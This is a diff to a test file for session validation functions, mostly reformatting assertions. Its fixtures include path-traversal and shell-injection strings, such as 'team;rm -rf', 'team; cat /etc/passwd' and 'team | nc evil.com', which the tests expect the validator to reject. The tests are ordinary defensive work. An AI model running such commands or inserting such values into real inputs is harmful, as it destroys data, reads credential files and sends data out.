@@ -18,7 +18,7 @@ import {
 } from "../../../src/session/validation.js";
 import { mkdirSync, rmSync } from "fs";
 
-describe("Session Validation Integration (New Architecture)", () => {
+describe("Session Validation Integration", () => {
   describe("UUID validation", () => {
     it("should validate correct UUID v4", () => {
       const validUUID = "550e8400-e29b-41d4-a716-446655440000";
@@ -53,7 +53,9 @@ describe("Session Validation Integration (New Architecture)", () => {
     });
 
     it("should reject invalid UUID format", () => {
-      expect(() => validateSessionId("invalid-id")).toThrow("Invalid session ID format");
+      expect(() => validateSessionId("invalid-id")).toThrow(
+        "Invalid session ID format",
+      );
     });
 
     it("should reject null or undefined session ID", () => {
@@ -76,20 +78,36 @@ describe("Session Validation Integration (New Architecture)", () => {
     });
 
     it("should reject dangerous characters", () => {
-      expect(() => validateTeamName("team/../etc")).toThrow("dangerous character");
-      expect(() => validateTeamName("team;rm -rf")).toThrow("dangerous character");
-      expect(() => validateTeamName("team\x00null")).toThrow("dangerous character");
+      expect(() => validateTeamName("team/../etc")).toThrow(
+        "dangerous character",
+      );
+      expect(() => validateTeamName("team;rm -rf")).toThrow(
+        "dangerous character",
+      );
+      expect(() => validateTeamName("team\x00null")).toThrow(
+        "dangerous character",
+      );
     });
 
     it("should reject path traversal attempts", () => {
-      expect(() => validateTeamName("../../../etc")).toThrow("dangerous character");
-      expect(() => validateTeamName("team/../../passwd")).toThrow("dangerous character");
+      expect(() => validateTeamName("../../../etc")).toThrow(
+        "dangerous character",
+      );
+      expect(() => validateTeamName("team/../../passwd")).toThrow(
+        "dangerous character",
+      );
     });
 
     it("should reject shell injection attempts", () => {
-      expect(() => validateTeamName("team; cat /etc/passwd")).toThrow("dangerous character");
-      expect(() => validateTeamName("team && echo bad")).toThrow("dangerous character");
-      expect(() => validateTeamName("team | nc evil.com")).toThrow("dangerous character");
+      expect(() => validateTeamName("team; cat /etc/passwd")).toThrow(
+        "dangerous character",
+      );
+      expect(() => validateTeamName("team && echo bad")).toThrow(
+        "dangerous character",
+      );
+      expect(() => validateTeamName("team | nc evil.com")).toThrow(
+        "dangerous character",
+      );
     });
 
     it("should reject null or undefined team name", () => {
@@ -112,9 +130,9 @@ describe("Session Validation Integration (New Architecture)", () => {
     });
 
     it("should reject non-existent path", () => {
-      expect(() => validateSecureProjectPath("/tmp/does-not-exist-12345")).toThrow(
-        "does not exist",
-      );
+      expect(() =>
+        validateSecureProjectPath("/tmp/does-not-exist-12345"),
+      ).toThrow("does not exist");
     });
 
     it("should reject relative paths", () => {
